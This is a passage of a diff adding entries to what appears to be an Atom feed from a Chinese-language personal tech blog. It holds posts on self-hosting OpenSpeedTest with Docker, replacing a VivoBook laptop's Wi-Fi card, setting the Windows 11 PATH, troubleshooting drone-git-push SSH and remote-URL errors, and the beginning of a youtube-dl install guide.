+&lt;p&gt;只是因為網路架構相當簡單，所以電腦、手機等終端的連線速度就等於連網際網路的速度&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;若是有在玩自架 homelab 的朋友網路架構絕對沒那麼簡單，可能比較像這張圖&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/content/network-complex.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在接到網際網路(後面以外網代稱)之前&lt;/p&gt;
+&lt;p&gt;接到路由器 Router 架設區域網路(後面以內網代稱)&lt;/p&gt;
+&lt;p&gt;然後連交換機 Switch 去串接各終端設備和伺服器、監視器等&lt;/p&gt;
+&lt;p&gt;所以如果我們要測試內網裡面電腦連伺服器的速度 如下圖&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/content/network-local.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Speedtest.net 當然就測不出來了&lt;/p&gt;
+&lt;h2 id=&#34;OpenSpeedTest&#34;&gt;&lt;a href=&#34;#OpenSpeedTest&#34; class=&#34;headerlink&#34; title=&#34;OpenSpeedTest&#34;&gt;&lt;/a&gt;OpenSpeedTest&lt;/h2&gt;&lt;p&gt;講了這麼多前提，主要就是要紹可以自己架設的 OpenSpeedTest&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://openspeedtest.com/&#34;&gt;官網&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/openspeedtest/latest&#34;&gt;DockerHub&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;只要把它架在自己的伺服器上，就可以像在用 Speedtest.net 一樣測試內網的網速🎉&lt;/p&gt;
+&lt;p&gt;這邊是官方那邊的 DEMO (沒錯它可以直接嵌在你的網頁內)&lt;/p&gt;
+&lt;div style=&#34;text-align:right;&#34;&gt;&lt;div style=&#34;min-height:360px;&#34;&gt;&lt;div style=&#34;width:100%;height:0;padding-bottom:50%;position:relative;&#34;&gt;&lt;iframe style=&#34;border:none;position:absolute;top:0;left:0;width:100%;height:100%;min-height:360px;border:none;overflow:hidden !important;&#34; src=&#34;//openspeedtest.com/Get-widget.php&#34;&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;/div&gt;Provided by  &lt;a href=&#34;http://openspeedtest.com&#34;&gt;OpenSpeedtest.com&lt;/a&gt;&lt;/div&gt;
+
+
+&lt;h2 id=&#34;安裝-OpenSpeedTest&#34;&gt;&lt;a href=&#34;#安裝-OpenSpeedTest&#34; class=&#34;headerlink&#34; title=&#34;安裝 OpenSpeedTest&#34;&gt;&lt;/a&gt;安裝 OpenSpeedTest&lt;/h2&gt;&lt;p&gt;OpenSpeedTest 大致分為3種安裝方式&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;安裝程式包&lt;/li&gt;
+&lt;li&gt;Docker&lt;/li&gt;
+&lt;li&gt;從原始碼手動架設&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;程式包&#34;&gt;&lt;a href=&#34;#程式包&#34; class=&#34;headerlink&#34; title=&#34;程式包&#34;&gt;&lt;/a&gt;程式包&lt;/h3&gt;&lt;p&gt;官方打包好的安裝檔在這邊&lt;a href=&#34;https://openspeedtest.com/speed-testing-application-for-your-website.php#Option-3&#34;&gt;下載頁&lt;/a&gt;可以找到&lt;/p&gt;
+&lt;p&gt;支援主流的作業系統 Windows, Mac, Linux 之外 連 Android 跟 IOS 都有 &lt;del&gt;用來測熱點性能?&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;點 Start Server 後就可以連 👉 給的的網址測速了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/images/content/OSTV2-SS.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;Docker&#34;&gt;&lt;a href=&#34;#Docker&#34; class=&#34;headerlink&#34; title=&#34;Docker&#34;&gt;&lt;/a&gt;Docker&lt;/h3&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;docker run --restart=unless-stopped --name openspeedtest -d -p 3000:3000 -p 3001:3001 openspeedtest/latest&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;啟動後連 &lt;a href=&#34;http://your-ip:3000/&#34;&gt;http://YOUR-IP:3000&lt;/a&gt; 或 &lt;a href=&#34;https://your-ip:3001/&#34;&gt;https://YOUR-IP:3001&lt;/a&gt; 測速&lt;/p&gt;
+&lt;h3 id=&#34;原始碼安裝&#34;&gt;&lt;a href=&#34;#原始碼安裝&#34; class=&#34;headerlink&#34; title=&#34;原始碼安裝&#34;&gt;&lt;/a&gt;原始碼安裝&lt;/h3&gt;&lt;p&gt;首先到 &lt;a href=&#34;https://github.com/openspeedtest/Speed-Test&#34;&gt;Github&lt;/a&gt; 下載或 clone 原始碼&lt;/p&gt;
+&lt;p&gt;準備好 Nginx ，套用&lt;a href=&#34;https://github.com/openspeedtest/Nginx-Configuration&#34;&gt;這邊&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;然後將下載好的OpenSpeedTest原始碼，放到 Nginx 的網頁資料夾就可以用了&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;要長期使用，推薦還是用 Docker 安裝，簡單省事&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="Self-Hosting" />
+        <category term="網路" />
+        <category term="Windows" />
+        <category term="Linux" />
+        <category term="Mac" />
+        <updated>2022-03-15T10:46:58.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2022/01/17/vivobook-s14-netcard/</id>
+        <title>ASUS VivoBook S14 S433 更換無線網卡</title>
+        <link rel="alternate" href="https://zonego.tw/2022/01/17/vivobook-s14-netcard/"/>
+        <content type="html">&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;p&gt;去年大概在10月左右買了 ASUS VivoBook S14 (S433)，起初用著都很正常&lt;/p&gt;
+&lt;p&gt;12月開始出現偶發的藍屏崩潰、網卡抓不到等現象&lt;/p&gt;
+&lt;p&gt;自從大學開始，電腦都是自己組以來，不知道已經有幾年沒看過這麼頻繁出現的藍屏…&lt;/p&gt;
+&lt;p&gt;爬文後才發現，大概是因為晶片短缺的原因，ASUS 這幾個月的筆電網卡會採用替代品，而不是之前常用的 Intel AX210&lt;/p&gt;
+&lt;p&gt;Intel 他們家的網卡跟 SSD 可是出了名的穩定耐用&lt;/p&gt;
+&lt;p&gt;趁著缺貨前趕快從某皮買一張 AX210 來換&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;警告! 自行更換網卡可能會破保固，換之前請想好&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;事前準備&#34;&gt;&lt;a href=&#34;#事前準備&#34; class=&#34;headerlink&#34; title=&#34;事前準備&#34;&gt;&lt;/a&gt;事前準備&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Intel AX210 網卡一張&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/Intel-AX210.jpg&#34; alt=&#34;AX210&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;星型螺絲起子 建議可以買XX合1那種螺絲起子組&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/screwdriver.jpg&#34; alt=&#34;screwdriver&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;尖頭鑷子&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/tweezers.jpg&#34; alt=&#34;tweezers&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;拆機&#34;&gt;&lt;a href=&#34;#拆機&#34; class=&#34;headerlink&#34; title=&#34;拆機&#34;&gt;&lt;/a&gt;拆機&lt;/h2&gt;&lt;div class=&#34;video-container&#34;&gt;&lt;iframe src=&#34;https://www.youtube.com/embed/gm1w6xI4cp0&#34; frameborder=&#34;0&#34; loading=&#34;lazy&#34; allowfullscreen&gt;&lt;/iframe&gt;&lt;/div&gt;
+
+&lt;p&gt;參考別人的拆機影片，把背蓋打開就看的到網卡了&lt;/p&gt;
+&lt;p&gt;紅框的地方就是網卡，天線用鑷子會比較好拆裝&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/asus-s433.jpg&#34; alt=&#34;asus-s433&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;換下的網卡 AW-XB468NF&lt;br&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/AW-XB468NF.jpg&#34; alt=&#34;AW-XB468NF&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;這張卡請保留好，之後要如果送修&lt;/p&gt;
+&lt;p&gt;需要在送修前先換回去，以免保固出問題&lt;/p&gt;
+&lt;p&gt;都裝好了才發現忘記拍照…&lt;/p&gt;
+</content>
+        <category term="DIY" />
+        <category term="筆記型電腦" />
+        <updated>2022-01-17T12:20:36.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2022/01/07/windows11-path/</id>
+        <title>Windows 11 環境變數及 Path 設定</title>
+        <link rel="alternate" href="https://zonego.tw/2022/01/07/windows11-path/"/>
+        <content type="html">&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h2 id=&#34;設定環境變數&#34;&gt;&lt;a href=&#34;#設定環境變數&#34; class=&#34;headerlink&#34; title=&#34;設定環境變數&#34;&gt;&lt;/a&gt;設定環境變數&lt;/h2&gt;&lt;p&gt;開啟設定 &amp;gt; 系統 &amp;gt; 關於 &amp;gt; 裝置規格 進階系統設定&lt;/p&gt;
+&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/setting_sys.png&#34; alt=&#34;env&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/env.png&#34; alt=&#34;env&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;設定-Path&#34;&gt;&lt;a href=&#34;#設定-Path&#34; class=&#34;headerlink&#34; title=&#34;設定 Path&#34;&gt;&lt;/a&gt;設定 Path&lt;/h2&gt;&lt;h3 id=&#34;預設位置&#34;&gt;&lt;a href=&#34;#預設位置&#34; class=&#34;headerlink&#34; title=&#34;預設位置&#34;&gt;&lt;/a&gt;預設位置&lt;/h3&gt;&lt;p&gt;Windows預設應用程式 path 位置&lt;/p&gt;
+&lt;figure class=&#34;highlight taggerscript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs taggerscript&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%USERPROFILE%&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;hljs-symbol&#34;&gt;\L&lt;/span&gt;ocal&lt;span class=&#34;hljs-symbol&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;hljs-symbol&#34;&gt;\W&lt;/span&gt;indowsApps&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;題外話 Linux 的預設位置在&lt;/p&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/usr/&lt;/span&gt;local/bin&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;為甚麼要設定-Path&#34;&gt;&lt;a href=&#34;#為甚麼要設定-Path&#34; class=&#34;headerlink&#34; title=&#34;為甚麼要設定 Path&#34;&gt;&lt;/a&gt;為甚麼要設定 Path&lt;/h3&gt;&lt;p&gt;設定路徑可以簡化找程式的時間&lt;/p&gt;
+&lt;p&gt;例如下載完 youtube-dl.exe 放在下載資料夾內時&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs powershell&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 未設定路徑&lt;/span&gt;&lt;br&gt;C:\Users\th533\Downloads\youtube&lt;span class=&#34;hljs-literal&#34;&gt;-dl&lt;/span&gt;.exe ...&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 有設定路徑&lt;/span&gt;&lt;br&gt;youtube&lt;span class=&#34;hljs-literal&#34;&gt;-dl&lt;/span&gt;.exe ...&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h3 id=&#34;新增、編輯-Path&#34;&gt;&lt;a href=&#34;#新增、編輯-Path&#34; class=&#34;headerlink&#34; title=&#34;新增、編輯 Path&#34;&gt;&lt;/a&gt;新增、編輯 Path&lt;/h3&gt;&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/env.png&#34; alt=&#34;env&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/env_path.png&#34; alt=&#34;env_path&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="Windows" />
+        <category term="環境變數" />
+        <updated>2022-01-07T02:52:56.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2022/01/06/drone-git-push/</id>
+        <title>drone-git-push 踩雷心得</title>
+        <link rel="alternate" href="https://zonego.tw/2022/01/06/drone-git-push/"/>
+        <content type="html">&lt;p&gt;&lt;a href=&#34;https://www.drone.io/&#34;&gt;Drone CI&lt;/a&gt; 是一個可以自行的 CI (Continuous Integration) 軟體&lt;/p&gt;
+&lt;p&gt;使用 CI 的用意就是為了，能在寫完程式時，自動測試、編譯與發佈程式。&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+
+&lt;p&gt;關於怎麼架設改天再寫一篇教學。 &lt;del&gt;Google一下應該就很多教學了&lt;/del&gt;&lt;/p&gt;
+&lt;h2 id=&#34;drone-git-push&#34;&gt;&lt;a href=&#34;#drone-git-push&#34; class=&#34;headerlink&#34; title=&#34;drone-git-push&#34;&gt;&lt;/a&gt;drone-git-push&lt;/h2&gt;&lt;p&gt;回來本篇主題&lt;/p&gt;
+&lt;p&gt;這次我的需求是在 Drone 的流程內，測試或編譯完程式後以 git 推送到不同的儲藏庫&lt;/p&gt;
+&lt;p&gt;其實就是要產生網站檔案後，推送到 GitHub 方便用 GitHub Page 或是 Cloudflare Page&lt;/p&gt;
+&lt;p&gt;在 Drone CI 中可以用 &lt;a href=&#34;http://plugins.drone.io/appleboy/drone-git-push/&#34;&gt;drone-git-push&lt;/a&gt; 做到&lt;/p&gt;
+&lt;p&gt;這次遇到的問題有2個 &lt;del&gt;害我為了找問題多花很多時間&lt;/del&gt;&lt;/p&gt;
+&lt;h2 id=&#34;儲存庫辨識失敗&#34;&gt;&lt;a href=&#34;#儲存庫辨識失敗&#34; class=&#34;headerlink&#34; title=&#34;儲存庫辨識失敗&#34;&gt;&lt;/a&gt;儲存庫辨識失敗&lt;/h2&gt;&lt;p&gt;錯誤訊息:&lt;/p&gt;
+&lt;figure class=&#34;highlight node-repl&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs node-repl&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;...&lt;/span&gt;&lt;br&gt;parse \&amp;quot;git@github.com:user/repo.git\&amp;quot;: first path segment in URL cannot contain colon&amp;quot;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;照原本文件寫的 &lt;code&gt;.drone.yml&lt;/code&gt; 大概是長這樣&lt;/p&gt;
+&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;name:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;deploy&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;git&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;image:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;appleboy/drone-git-push&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;settings:&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;branch:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;main&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;remote:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;git@github.com:user/repo.git&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;force:&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;commit:&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;參考&lt;a href=&#34;https://github.com/appleboy/drone-git-push/issues/40&#34;&gt;GitHub討論區&lt;/a&gt;的解決方法&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用緊急修補的 image&lt;/li&gt;
+&lt;li&gt;remote 改用字串&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;name:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;deploy&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;git&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;image:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;appleboy/drone-git-push:0.2.0-linux-amd64&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;settings:&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;branch:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;main&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;remote:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;git@github.com:user/repo.git&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;force:&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;commit:&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;true&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h2 id=&#34;SSH-Key-讀取失敗&#34;&gt;&lt;a href=&#34;#SSH-Key-讀取失敗&#34; class=&#34;headerlink&#34; title=&#34;SSH Key 讀取失敗&#34;&gt;&lt;/a&gt;SSH Key 讀取失敗&lt;/h2&gt;&lt;p&gt;由於資安的關係， SSH KEY 不可以跟著程式碼推送到儲存庫，更不可能放明碼在設定檔中&lt;/p&gt;
+&lt;p&gt;在 Drone CI 要改用 secret 的功能&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;.drone.yml&lt;/code&gt; 大概長這樣&lt;/p&gt;
+&lt;figure class=&#34;highlight yaml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs yaml&#34;&gt;&lt;span class=&#34;hljs-bullet&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;hljs-attr&#34;&gt;name:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;deploy&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;git&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;image:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;appleboy/drone-git-push:0.2.0-linux-amd64&lt;/span&gt;&lt;br&gt;  &lt;span class=&#34;hljs-attr&#34;&gt;settings:&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;branch:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;main&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-attr&#34;&gt;ssh_key:&lt;/span&gt;&lt;br&gt;      &lt;span class=&#34;hljs-attr&#34;&gt;from_secret:&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;githubkey&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;另外在 Drone CI 的 WebUI 上添加 Secret&lt;/p&gt;
+&lt;p&gt;將 private key 的內文貼進去&lt;/p&gt;
+&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;/images/content/DroneCI-secret.png&#34; alt=&#34;secret&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然後就碰到問題了&lt;/p&gt;
+&lt;p&gt;錯誤訊息:&lt;/p&gt;
+&lt;figure class=&#34;highlight node-repl&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs node-repl&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;...&lt;/span&gt;&lt;br&gt;Load key &amp;quot;/root/.ssh/id_rsa&amp;quot;: invalid format&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;參考&lt;a href=&#34;https://github.com/appleboy/drone-git-push/issues/37&#34;&gt;GitHub討論區&lt;/a&gt;的解決方法&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;產生的 SSH key 需要改用 PEM&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;ssh-keygen -t rsa -b 4096 -C &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;your_email@example.com&amp;quot;&lt;/span&gt; -m PEM&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;換完 KEY 甚麼問題都沒了🎉&lt;/p&gt;
+</content>
+        <category term="CI/CD" />
+        <category term="Drone" />
+        <category term="Git" />
+        <updated>2022-01-06T12:15:54.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://zonego.tw/2021/12/19/youtuve-dl/</id>
+        <title>用指令下載影片吧 youtube-dl</title>
+        <link rel="alternate" href="https://zonego.tw/2021/12/19/youtuve-dl/"/>
+        <content type="html">&lt;p&gt;你想下載 Youtube、Facebook 或是 twitter 上的影片嗎?&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;p&gt;雖然名稱叫 youtube 下載，但 &lt;a href=&#34;https://ytdl-org.github.io/youtube-dl/supportedsites.html&#34;&gt;youtube-dl支援的網站&lt;/a&gt; 多達一千多個&lt;/p&gt;
+&lt;p&gt;只要到 &lt;a href=&#34;https://ytdl-org.github.io/youtube-dl/index.html&#34;&gt;這裡&lt;/a&gt; 就能下載&lt;/p&gt;
+&lt;p&gt;對於初學者會卡的地方，大概就只有不熟悉指令界面而已 (可能還有youtube的限速)&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;甚麼?你說打指令你不會用?&lt;/p&gt;
+&lt;p&gt;那你可以改用 &lt;a href=&#34;/2021/12/10/youtube-dlg/&#34;&gt;&lt;strong&gt;youtube-dl gui&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;詳細教學&#34;&gt;&lt;a href=&#34;#詳細教學&#34; class=&#34;headerlink&#34; title=&#34;詳細教學&#34;&gt;&lt;/a&gt;詳細教學&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;/2022/04/10/youtube-dl-quality/&#34;&gt;指定下載畫質&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/2022/04/10/youtube-dl-subtitle/&#34;&gt;下載字幕&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;/2022/04/10/youtube-dl-login/&#34;&gt;登入並下載影片&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;安裝&#34;&gt;&lt;a href=&#34;#安裝&#34; class=&#34;headerlink&#34; title=&#34;安裝&#34;&gt;&lt;/a&gt;安裝&lt;/h2&gt;&lt;h3 id=&#34;Windows-版本&#34;&gt;&lt;a href=&#34;#Windows-版本&#34; class=&#34;headerlink&#34; title=&#34;Windows 版本&#34;&gt;&lt;/a&gt;Windows 版本&lt;/h3&gt;&lt;p&gt;Windows 需要 Microsoft Visual C++ 2010 Service Pack 1 Redistributable Package (x86)&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe&#34;&gt;https://download.microsoft.com/download/1/6/5/165255E7-1014-4D0A-B094-B6A430A6BFFC/vcredist_x86.exe&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;套件連結至微軟網站，請放心服用&lt;/p&gt;
+&lt;p&gt;安裝後下載 Windows.exe 搬到預設應用程式的位置&lt;/p&gt;
+&lt;figure class=&#34;highlight taggerscript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs taggerscript&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;%USERPROFILE%&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;\A&lt;/span&gt;ppData&lt;span class=&#34;hljs-symbol&#34;&gt;\L&lt;/span&gt;ocal&lt;span class=&#34;hljs-symbol&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;hljs-symbol&#34;&gt;\W&lt;/span&gt;indowsApps&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;或是參考這篇 &lt;a href=&#34;/2022/01/07/windows11-path/&#34;&gt;Windows 11 環境變數及 Path 設定&lt;/a&gt; 設定路徑(Path)環境變數&lt;/p&gt;
+&lt;p&gt;使用 CMD, Powershell 或 windows terminal 就可以直接使用&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;Linux-Mac-版本&#34;&gt;&lt;a href=&#34;#Linux-Mac-版本&#34; class=&#34;headerlink&#34; title=&#34;Linux, Mac 版本&#34;&gt;&lt;/a&gt;Linux, Mac 版本&lt;/h3&gt;&lt;p&gt;Linux 及 Mac 需要 Python 2.6, 2.7, 或 3.2+ 以上的版本才能執行&lt;/p&gt;
+&lt;p&gt;可以到 &lt;a href=&#34;https://www.python.org/&#34;&gt;Python 官網&lt;/a&gt; 下載&lt;/p&gt;
+&lt;p&gt;透過網路下載 youtube-dl&lt;/p&gt;
